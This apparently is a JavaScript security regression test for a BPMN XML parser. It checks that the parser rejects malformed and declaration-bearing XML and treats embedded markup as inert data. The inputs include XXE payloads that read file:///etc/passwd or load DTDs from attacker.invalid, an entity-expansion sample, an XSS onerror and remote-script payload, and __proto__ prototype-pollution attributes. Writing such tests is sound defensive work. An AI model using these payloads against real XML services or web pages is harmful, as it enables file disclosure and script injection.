#!/usr/bin/env node
/** Inert-tokenizer security and strict XML regression gate. */
import assert from 'node:assert/strict';
import { BpmnModdle } from '../lib/bpmn/moddle.js';
import { parseXmlTree } from '../lib/bpmn/xml.js';

const moddle = BpmnModdle();
const wrap = inner => `<b:definitions xmlns:b="http://www.omg.org/spec/BPMN/20100524/MODEL" xmlns:v="urn:vendor" targetNamespace="urn:test"><b:process id="P">${ inner }</b:process></b:definitions>`;
const rejects = [
  '<!DOCTYPE definitions SYSTEM "https://attacker.invalid/external.dtd">' + wrap(''),
  '<!DOCTYPE definitions PUBLIC "public" "file:///etc/passwd">' + wrap(''),
  '<!DOCTYPE definitions [<!ENTITY secret SYSTEM "file:///etc/passwd">]>' + wrap('<b:documentation>&secret;</b:documentation>'),
  '<!DOCTYPE definitions [<!ENTITY % remote SYSTEM "https://attacker.invalid/evil.dtd">%remote;]>' + wrap(''),
  '<!DOCTYPE definitions [<!ENTITY a "large"><!ENTITY b "&a;&a;&a;&a;">]>' + wrap(''),
  '<!-- harmless -->\n<!DOCTYPE definitions>' + wrap(''),
  '<!ENTITY external SYSTEM "https://attacker.invalid/">' + wrap(''),
  wrap('<b:documentation>&unknown;</b:documentation>'),
  wrap('<b:documentation>&amp</b:documentation>'),
  wrap('<b:documentation>&#0;</b:documentation>'),
  wrap('<b:documentation>&#xD800;</b:documentation>'),
  wrap('<b:documentation>&#x110000;</b:documentation>'),
  wrap('<b:documentation>&#-1;</b:documentation>'),
  wrap('<b:documentation>&#X41;</b:documentation>'),
  wrap('<b:documentation>&AMP;</b:documentation>'),
  wrap('<b:documentation>]]></b:documentation>'),
  wrap('<![CDATA[unterminated'),
  wrap('<!-- invalid -- comment -->'),
  wrap('<!-- trailing dash--->'),
  wrap('<v:payload attr="literal < character"/>'),
  wrap('<v:payload attr="first" attr="second"/>'),
  wrap('<v:payload xmlns:a="urn:attr" xmlns:c="urn:attr" a:x="first" c:x="second"/>'),
  wrap('<v:payload unbound:x="value"/>'),
  wrap('<missing:payload/>'),
  wrap('<v:payload xmlns:xml="urn:wrong"/>'),
  wrap('<v:payload xmlns:xmlns="urn:wrong"/>'),
  wrap('<v:payload xmlns:x="http://www.w3.org/2000/xmlns/"/>'),
  wrap('<v:payload xmlns:x="http://www.w3.org/XML/1998/namespace"/>'),
  wrap('<v:payload xmlns:v=""/>'),
  wrap('<v:a:b/>'),
  wrap('<v:payload attr=unquoted/>'),
  wrap('<v:payload attr="one"other="two"/>'),
  wrap('<v:payload>\u0000</v:payload>'),
  '<?xml version="1.0"encoding="UTF-8"?>' + wrap(''),
  '<?xml version="1.0"?><?xml version="1.0"?>' + wrap(''),
  ' <?xml version="1.0"?>' + wrap(''),
  wrap('') + wrap(''),
  '<root><child></root>',
  '<root/>not whitespace',
  '<!-- no root -->'
];
let externalCalls = 0;
const previous = new Map();
for (const name of [ 'DOMParser', 'XMLSerializer', 'fetch', 'XMLHttpRequest', 'document' ]) {
  previous.set(name, Object.getOwnPropertyDescriptor(globalThis, name));
  Object.defineProperty(globalThis, name, { configurable: true, get() { externalCalls++; throw new Error('Forbidden ambient API: ' + name); } });
}
try {
  for (const xml of rejects) await assert.rejects(moddle.fromXML(xml), 'must reject malformed/declaration-bearing XML');
  const text = '<img src="https://attacker.invalid/pixel" onerror="alert(1)"> <!DOCTYPE harmless> & literal';
  const hostileButInert = '<?xml version="1.0"?>\n<?xml-stylesheet href="https://attacker.invalid/style.xsl"?>\n<!--before-->' + wrap(`<b:scriptTask id = 'S' scriptFormat = "javascript"><b:script><![CDATA[${ text }]]></b:script><b:extensionElements><v:payload __proto__="retained" constructor="safe">before<![CDATA[<&>]]><script xmlns="http://www.w3.org/1999/xhtml" src="https://attacker.invalid/run.js">throw new Error("never executes")</script>after<!--opaque comment--><?vendor instruction?></v:payload></b:extensionElements></b:scriptTask>`) + '<!--after-->';
  const imported = await moddle.fromXML(hostileButInert);
  assert.equal(imported.elementsById.get('S').script, text);
  const exported = (await moddle.toXML(imported.rootElement)).xml;
  assert.ok(exported.includes('<?xml-stylesheet href="https://attacker.invalid/style.xsl"?>'));
  assert.ok(exported.includes('<!--before-->') && exported.includes('<!--after-->'));
  assert.ok(exported.includes('<?vendor instruction?>') && exported.includes('<!--opaque comment-->'));
  assert.ok(exported.includes('__proto__="retained"'));
  const again = await moddle.fromXML(exported);
  assert.equal(again.elementsById.get('S').script, text);
  const payload = again.elementsById.get('S').extensionElements.values[0];
  assert.equal(Object.prototype.hasOwnProperty.call(payload, '__proto__'), true);
  assert.equal(payload.__proto__, 'retained');
  assert.equal(payload.constructor, 'safe');
  assert.equal(payload.$children[0].$type, 'script');
  assert.equal(payload.$children[0].$descriptor.ns.uri, 'http://www.w3.org/1999/xhtml');

  const unicode = parseXmlTree('<root xmlns="urn:default" xmlns:p="urn:attribute" a = "line\r\nnext&#10;&#x1F680;" p:значение = "&#128640;">&#x1F680;&#128640;\r\ntext<![CDATA[&amp;]]></root>').documentElement;
  assert.equal(unicode.textContent, '🚀🚀\ntext&amp;');
  assert.equal(unicode.getAttributeNS(null, 'a'), 'line next\n🚀');
  assert.equal(unicode.getAttributeNS('urn:attribute', 'значение'), '🚀');
  assert.equal(unicode.namespaceURI, 'urn:default');
  assert.equal(unicode.getAttributeNS(null, 'значение'), null);
  const namespace = await moddle.fromXML(wrap('<b:extensionElements><__proto__:payload xmlns:__proto__="urn:safe">retained</__proto__:payload></b:extensionElements>'));
  assert.ok((await moddle.toXML(namespace.rootElement)).xml.includes('xmlns:__proto__="urn:safe"'));
  const specialProperties = JSON.parse('{"__proto__":"kept-prototype-name","constructor":"kept-constructor","__extras":"kept-extra-name","get":"kept-get","set":"kept-set","$body":"body"}');
  const special = moddle.createAny('v:special', 'urn:vendor', specialProperties);
  for (const key of [ '__proto__', 'constructor', '__extras', 'get', 'set' ]) {
    assert.equal(Object.getOwnPropertyDescriptor(special, key).enumerable, true);
    assert.equal(special[key], specialProperties[key]);
  }
  const created = moddle.create('bpmn:Definitions', { targetNamespace: 'urn:new', rootElements: [ moddle.create('bpmn:Process', { id: 'Created', extensionElements: moddle.create('bpmn:ExtensionElements', { values: [ special ] }) }) ] });
  const createdAgain = await moddle.fromXML((await moddle.toXML(created)).xml);
  const specialAgain = createdAgain.elementsById.get('Created').extensionElements.values[0];
  for (const key of [ '__proto__', 'constructor', '__extras', 'get', 'set' ]) assert.equal(specialAgain[key], specialProperties[key]);
  assert.equal(externalCalls, 0, 'SAX import/export must never touch DOM/HTML/network APIs');
  console.log(`OK inert XML security: ${ rejects.length } rejected attacks/malformed documents, no DOM/HTML/network API access, strict Unicode/entities/namespaces, opaque comments/PI/CDATA preserved`);
} finally {
  for (const [ name, descriptor ] of previous) {
    if (descriptor) Object.defineProperty(globalThis, name, descriptor);
    else delete globalThis[name];
  }
}
